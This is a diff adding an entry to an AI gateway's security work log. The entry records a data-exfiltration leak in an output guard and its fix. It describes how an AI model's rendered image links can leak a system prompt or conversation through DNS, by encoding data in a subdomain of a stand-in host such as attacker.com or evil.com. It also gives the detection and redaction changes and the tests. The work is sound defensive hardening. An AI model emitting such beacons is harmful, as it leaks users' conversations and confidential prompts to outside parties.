@@ -2688,3 +2688,31 @@ Audited + verified the owned frontend components (no code change needed — alre
   the completion condition "Playwright passes" is honestly not-yet-met (not a component defect).
 R6 status: owned components detector-clean + building + unit-tested + security-verified + a11y-complete; only the
 browser-driven Playwright gate remains, blocked on dashboard auth. (No frozen-golden or backend change this iter.)
+
+---
+
+## G92 (CONFIRMED NEW LEAK — fixed) — 2026-07-03 — DNS-subdomain exfil in auto-render beacon
+The exfil-URL detector `_url_smuggles_data` analyzed only `_url_tail(url)` = path+query+fragment; `_url_tail`
+DELIBERATELY drops scheme+HOST. So a beacon that smuggles data in the HOSTNAME —
+`https://<hex/base64-blob>.attacker.com/pixel.png` — was never scanned on the host. When a client
+auto-fetches the image, RESOLVING the host leaks the subdomain to the attacker's authoritative DNS server
+(classic DNS exfiltration; the HTTP GET need not even succeed). CONFIRMED: hex/base64-encoded ARBITRARY data
+(system prompt / conversation) in the subdomain → verdict **allow**, DNS-recoverable=True. (PII-in-host was
+already caught by the text scan since the value is literal, e.g. `123-45-6789.evil.com`.) Also the `_defang`
+preserved the host prefix (`{host}/[exfil-redacted]`) — so even after detection fired, the exfil subdomain
+survived the "defang".
+**FIX (owned output_guard.py, `_url_smuggles_data` + `neutralize_exfil_channels._defang`):**
+  * DETECTION: extract the host (`(?:https?:)?//([^/?#]*)`, strip port) and fold it + its `.`/`-`/`_`-segmented
+    labels into the SAME `_sources` (transport-decode → encoded_payload) and `probe` (detect_* →
+    sensitive_payload). The ≥24-token gate + printable check keep benign short subdomains (api/cdn/www) and
+    binary-decoding random-hash CDN subdomains out. Also fixed the early `if not tail: return ""` → `if not
+    tail and not host` so a host-only beacon (no path) is still analyzed.
+  * DEFANG: `_defang` now redacts the WHOLE reference (`[exfil-redacted]`) when the HOST itself smuggles
+    (checked via `_url_smuggles_data("//"+host)`), instead of preserving the exfil host prefix.
+**Verify:** hex/base64 subdomain (arbitrary data), SSN subdomain, host-only beacon → flagged
+(encoded_payload/sensitive_payload); full egress (md/html/srcset) → **redact**, DNS-recoverable=**False**
+(whole URL masked); FP-clean on api.stripe / cloudfront-hash / www / s3-bucket / long-legit-subdomain.
+In-process golden **544 ×3 consecutive clean** (GATEWAY_LIVE=0); backend `ai_mesh_gateway/tests` **1782 passed**.
+**Frozen:** golden `test_g92_*` (4 flag + 5 FP via `_url_smuggles_data`) + integration
+`test_output_transport_egress.py::test_g92_*` (full defang, md/html/srcset + 2 FP).
+Session ledger: SIXTEEN confirmed leaks (G74/G75/G76/G81/G82/G83/G84/G85/G86/G87/G88/G89/G90/G91/G92) + soft DoS (G79) fixed; G77/G78/G80 frozen.
